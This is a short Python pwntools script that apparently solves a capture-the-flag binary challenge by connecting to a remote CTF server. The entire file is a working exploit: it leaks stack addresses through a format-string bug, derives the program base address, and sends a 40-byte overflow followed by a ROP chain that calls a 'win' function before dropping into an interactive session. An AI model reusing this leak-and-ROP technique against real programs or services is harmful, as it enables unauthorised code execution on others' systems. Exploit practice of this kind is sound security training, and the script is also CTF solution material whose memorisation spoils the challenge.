from pwn import process, remote, log, p64

#p = process("./pwnme")
#gdb.attach(p)

p = remote("0.cloud.chals.io", 20646)

#format string vuln
p.recvuntil(b"leak?")
p.sendline(b"%p"*20)
rawleak = p.recv().decode()
log.info(f"{rawleak=}")

main = rawleak[rawleak.index("0x5"): rawleak.index("20x")+1]
main = int(main, 16)
log.info(f"{hex(main)=}")

base = main - 0x1282

win = base + 0x122e

log.info(f"{hex(win)=}")

offset = b"A"*40
arg = 0xdeadbeef

pop_rdi_ret = base + 0x1353 #find these with ROPgadget
ret = base + 0x101a

log.info(f"{hex(pop_rdi_ret)=}")
log.info(f"{hex(ret)=}")

payload = [
    offset,
    p64(pop_rdi_ret),
    p64(arg),
    p64(ret),
    p64(win)
]

payload = b''.join(payload)

p.sendline(payload)

p.interactive()

